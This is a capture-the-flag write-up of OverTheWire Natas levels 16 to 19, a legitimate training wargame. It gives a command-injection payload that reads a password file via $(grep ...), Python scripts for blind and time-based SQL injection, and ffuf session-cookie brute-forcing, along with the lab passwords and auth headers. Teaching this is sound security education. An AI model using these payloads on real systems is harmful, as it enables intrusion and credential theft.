---
title: overthewire natas 16-19
tags: web writeup
---

## Natas 16
Username: `natas16`

Password: `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`

Url: `http://natas16.natas.labs.overthewire.org/`

This challenge looks alot like the `natas10` challenge, but this time it states at the top `For security reasons, we now filter even more on certain characters`. We kinda know what the submit button is doing to lets take a look at the source code.

![](images/Pasted image 20210318131956.png)

So we notice it does filter out some more characters, but it missed some the `$`, `(` and `)`. With `$()` we can execute bash commands. Also they did not filter out `#` meaning we can comment out the last part. 

But we will quickly notice we cannot use the samepayload as last time `a /etc/natas_webpass/natas17 #` as the comment will not work, we notice that it uses double quotes around our key variable.

This took my some time to figure out and i really enjoyed this challenge. Kudos to the creators. 

Let me setup the same scenario locally to explain how we can extract the natas17 password.

I created two files in a folder like so

![](images/Pasted image 20210318133126.png)
 
We want to extract `s3cr3tPassw0rD` password, we can use `$()` but it must be wrapped in double quotes. 

Like so: `grep -i "INJECT_HERE" dictionary.txt`
 
Now we know the word `haircuts` exists in the dictionary, so using the command `grep -i "haircuts" dictionary.txt` will print the word.

![](images/Pasted image 20210318132911.png)
 
If i add a single letter at the end of that word, the grep command will not match it with anything resulting in nothing.

![](images/Pasted image 20210318132951.png)
 
Something else we can note down is when we use `$()` next to a word in bash it will concatanate it like so:

![](images/Pasted image 20210318133211.png)
 
To solve this challenge we can use another grep next to the word haicuts, if the grep matches the password it will print the password and concatanate it next to the `haircuts` word thus `haircuts` will not be shown in the output because it dose not match.
 
Let me explain, we can use `^` in grep to grep for words beginning with the letter we specify.

![](images/Pasted image 20210318134030.png)
 
This first shows all `s` in the word and prints it, but the second shows all the words with `s` at the beginning. We know that 3 is in the password but not at the start so this will not print the word.

![](images/Pasted image 20210318134146.png)
 
Meaning that is this is concatanated to the `haircuts` word in the dictionary it will print out haircuts because nothing was concatanated to end of it. But if we find the correct letter `s` it will concatanate the whole password to the word haircuts and will not show any output. This reminded me alot about the Boolean blind sql injection challenge.
 
![](images/Pasted image 20210318134404.png)
 
This first one printed the word haircuts so we know it does not start with `3` (False) and the second did not meaning it starts with `s` (True).
 
For the challenge lets find a word. i used `crosswords`

![](images/Pasted image 20210318134525.png)
 
Now i worte a simple python script to extract the password.
 
```py
import requests
from string import ascii_letters, digits

letters=ascii_letters + digits

url = "http://natas16.natas.labs.overthewire.org/"
headers={
	"Authorization":"Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="
}

password = ""

for i in range(32):
	for char in letters:
		data = {
			"needle":"crosswords$(grep ^"+password+char+" /etc/natas_webpass/natas17)"
		}

		r = requests.post(url, data, headers=headers)
		if "crosswords" not in r.text:
			password+=char
			print(password)
			break

print("Natas17 password: " + password)
```
 

___
## Natas 17
Username: `natas17`

Password: `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`

Url: `http://natas17.natas.labs.overthewire.org/`

This challenge looks exactly the same as the `natas15` challenge. But we can quickly notice we have no output we inputing a username.

Looking at the source code we see why.

![](images/Pasted image 20210318140055.png)

The echo commands have been commented out.

We still have a SQL injection by looking at the query variable and the database still has a username and password column.

We can use Time based sqlinjection, instead of checking the output to recognize True or False statements we can add to our payload a `and sleep(2)` like so:
`natas18" and password like binary '%a%' and sleep(2);-- -` 

If `a` is in the password the statement will be -> 1 and 1 and 1 which equals 1 in boolean algebra thus the sleep will execute and we can see our response time will be over 2 seconds long (True statement)

But if `a` is not in the password the statement will be -> 1 and 0 and 1 which equals 0 thus the sleep will NOT execute and our response will be under 2 seconds (False statement).

Lets write a small script to test out true and false statements.

```py
import requests

url = "http://natas17.natas.labs.overthewire.org/index.php"

headers = { # Header requierd to access the challenge
	"Authorization":"Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="
}

data = {
	"username":'natas18" and 1=1 and sleep(5);-- -'
}

r = requests.post(url,data,headers=headers)
print("Response Time: " + str(r.elapsed.total_seconds()))

```

First i tried with `1=1` since i know it is true:

![](images/Pasted image 20210318141311.png)

Next we can try `1=0` which is false

![](images/Pasted image 20210318141334.png)

And now we have our true/false statements we can write a script much like the previous one but with sleep statements.

```py
import requests
from string import ascii_letters, digits, punctuation

url = "http://natas17.natas.labs.overthewire.org/index.php"

headers = { # Header requierd to access the challenge
	"Authorization":"Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="
}

letters=ascii_letters + digits
all_chars = ""
for char in letters:
	data = {
		"username":'natas18" and password like binary "%'+char+'%" and sleep(2);-- -'
	}

	r = requests.post(url, data, headers=headers)

	if r.elapsed.total_seconds() > 2:
		all_chars+=char
		print(all_chars)

print("All chars in password: " + all_chars)
password = ""

for i in range(32):
	for char in all_chars:
		data = {
			"username":'natas18" and password like binary "'+password+char+'%" and sleep(2);-- -'
		}
		r = requests.post(url, data, headers=headers)

		if r.elapsed.total_seconds() > 2:
			password+=char
			print(password)
			break

print("Natas18 password: " + password)
```
	
Time based sqlinjections are not fully reliable. So it might take 2-3 trys sinces the server might take a while to respond without the sleep statement, also tweak the amount of seconds to sleep for your liking.

___
## Natas 18
Username: `natas18`

Password: `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`

Url: `http://natas18.natas.labs.overthewire.org/`

We see a simple login page when viewing the site. If we login with any credentials we get this page:

![](images/Pasted image 20210318173021.png)

We also get a phpsession cookie

![](images/Pasted image 20210318173133.png)

Lets take a look at the source code

![](images/Pasted image 20210318173635.png)

To get the natas19 credentials we need to login as admin. We can not change our session variable, so lets have a look at the cookie.

![](images/Pasted image 20210318173726.png)

There are only 640 different sessions ids, this can be easily bruteforced until we find an admin account.

I created a simple wordlist with numbers from 1-640

![](images/Pasted image 20210318173922.png)

And used `ffuf` tool to bruteforce the cookie, and filtered out the size of the normal response.

![](images/Pasted image 20210318174121.png)

Here we can see the cookie ID 119 has a different response size.

I changed my cookie variable to `119` and got the natas19 password

___
## Natas 19
Username: `natas19`

Password: `4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs`

Url: `http://natas19.natas.labs.overthewire.org/`

From the home page we see that this challenge is exactly the same as the previous one

![](images/Pasted image 20210318174417.png)

Lets login with any credentials and see what type of cookie we get.
Cookie: `3438312d7361696e74`

We do not get source code for this challenge, the cookie looks like hex, lets try and decode it. Here i just used cyberchef to decode.

My cookie decodes to -> `481-saint` 

We need to login as admin so we can guess to cookie should be `<num>-admin`
Also i guessed that the number might still be up to 640, so i created a simple wordlist again with numbers 1-640 and added `-admin` to the end of each, then hex encoded all.

Now i can bruteforce the cookie with `ffuf` as i did in the previous challenge

Creating wordlist (fish):

```bash
for i in (seq 640)
	set str $i-admin
	set hex (echo -n $str | xxd -pu)
	echo $hex
end > wordlist.txt
```
	
![](images/Pasted image 20210318175331.png)

Bruteforce with `ffuf`:
`ffuf -u http://natas19.natas.labs.overthewire.org/index.php -H "Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==" -b "PHPSESSID=FUZZ" -w wordlist.txt -fs 1050`

And i got a different response size with the cookie `3238312d61646d696e`

Set it as my cookie and got the natas20 password